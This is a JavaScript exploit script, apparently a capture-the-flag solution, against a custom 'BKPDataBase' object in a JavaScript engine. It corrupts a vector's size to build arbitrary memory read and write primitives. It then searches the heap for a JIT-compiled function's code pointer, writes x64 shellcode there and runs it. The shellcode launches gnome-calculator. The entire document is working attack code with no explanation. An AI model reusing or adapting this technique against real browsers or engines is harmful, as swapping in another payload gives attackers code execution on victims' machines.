function print(x){
    document.write(x+'<br>');
}

function exploit(){
for(var ii=0;ii<10000;ii++){

    var db = BKPDataBase.create("1", "1");
    key_1=Math.floor(Math.random()*1e12);
    //print ("Key_1 ==> "+key_1.toString(16))
    for(var i =0;i<50;i++){
        var temp=db.createStore("B", 1, [0,2,3,4,5,6,7,8,9,10], 1);
    }
    var B=db.createStore("B", 1, [0,2,3,4,5,6,7,8,9,10], 1);
    var C=db.createStore("C", 1, [0,0x12345,0x2222,0x3333,5,6,7,8,9,10], key_1);
    B.remove(-1);// Qvector's offset ==> 0 
    B.insert(0,0xfffff00000001);// 增大 Qvector's size，以增大读取范围

    var C_vector_addr=-1;
    var BC_offset=-1;
    for (var i = 0;i<=400;i++){
        //find C's int_Qvector_address
        if (B.get(i)==key_1&&B.get(i-1)==B.get(i-3)){
            C_vector_addr=B.get(i-2)             
        }
        /*find B to C elements offset */
        if(B.get(i)==0x12345&&B.get(i+1)==0x2222&B.get(i+2)==0x3333){
            BC_offset=i-1;
        }
    }//for (i)
    if(C_vector_addr ==-1||BC_offset==-1)
        continue;
    print("C_vector_addr ==> 0x"+ C_vector_addr.toString(16));
    print("BC_offset ==> "+BC_offset);
    var B_addr=C_vector_addr+24-BC_offset*8; //B_vector_address
    print("B_Qvector_addr ==> 0x" + B_addr.toString(16));
    var BC_offset_offset=BC_offset-1;
    print("BC_offset_offset ==> "+BC_offset_offset);
    /*任意读*/
    function read_at(addr){
        var i=addr-C_vector_addr;
        B.insert(BC_offset_offset,i);//将C的Qvector的size写为i
        var temp=C.get(0);//获得内容
        B.insert(BC_offset_offset,24);
        return temp;
    }
    /*任意写 */  
    function write(addr,content){
        var i = addr-C_vector_addr;
        B.insert(BC_offset_offset,i);
        C.insert(0,content);
        B.insert(BC_offset_offset,24);
    }
 //  print(read_at(C_vector_addr+16).toString(16));
 func_addr=null;
   var bab = "A"; 
         targeted = function(a) {
             for(var i = 1;i<10000;i++){
                 a=a^0x123456;
             }
             return a;
         } 
         _yol = new Array(20);
         for (i=0;i<20;i++)
            _yol[i] = bab;
         _yol[13] = targeted;
         func_addr = null;
         obj1_addr = B_addr;
         for (var jimbo = obj1_addr;func_addr == null;jimbo-=8) {
            chunksz = read_at(jimbo);
            if (chunksz < 0x20 || (chunksz & 0xf1) != chunksz)
               continue;
            chunksz -= chunksz & 1;
            nextsz = read_at(jimbo+chunksz);
            if (nextsz < 0x20 || (nextsz & 0xfff1) != nextsz || (nextsz&1)!=1)
               continue;
               
            heapaddr = read_at(jimbo+10*8);
            if ((heapaddr <= obj1_addr) || ((heapaddr & 0xfff) != 0))
               continue;
            if (heapaddr != read_at(jimbo + 11*8))
               continue;
            
            nbregions = read_at(jimbo+2*8);
            regsz = read_at(jimbo+4*8);
            heapsz = read_at(jimbo + 12*8);
            if (nbregions != 2 || ((heapsz & 0xfff) != 0) || ((regsz & 0xfff) != 0) || heapsz == 0 || nbregions*regsz != heapsz)
               continue;
      
            for (i=8;i<heapsz;i+=8) {
               babar = read_at(heapaddr + i);
               if (babar < obj1_addr) continue;
               match = true;
               for (j=1;j<20;j++) {
                  if (((j == 13) && (read_at(heapaddr + i + j*8) == babar)) || ((j != 13) && (read_at(heapaddr + i + j*8) != babar))) {
                     match = false;
                     break;
                  }
               }
               if (match == true) {
                  func_addr = read_at(heapaddr + i + 13*8);
                  sc_placeholder_obj = read_at(heapaddr + i + 12*8)
                  break;
               }
            }
         }
        targeted(1);
        jit_ptr = read_at(func_addr + 8*3) + 8*4
        jit_addr = read_at(jit_ptr)
        print("jit_addr ==> 0x"+jit_addr.toString(16));
        
        var shellcode_x64= "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x75\x50\xeb\x1f\x5f\x6a\x00\x57\x48\x8d\x34\x24\xeb\x34\x5a\x6a\x00\x52\x48\x8d\x14\x24\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x67\x6e\x6f\x6d\x65\x2d\x63\x61\x6c\x63\x75\x6c\x61\x74\x6f\x72\x00\xe8\xc7\xff\xff\xff\x44\x49\x53\x50\x4c\x41\x59\x3d\x3a\x30\x00";
        print(shellcode_x64);
        
        for (var p = 0; p< shellcode_x64.length ; p++){
            write(jit_addr + p  , shellcode_x64.charCodeAt(p));
        }
        alert("GO???");
        targeted(1);
        
        break;
 }// for (ii)
}//exploit()

exploit()
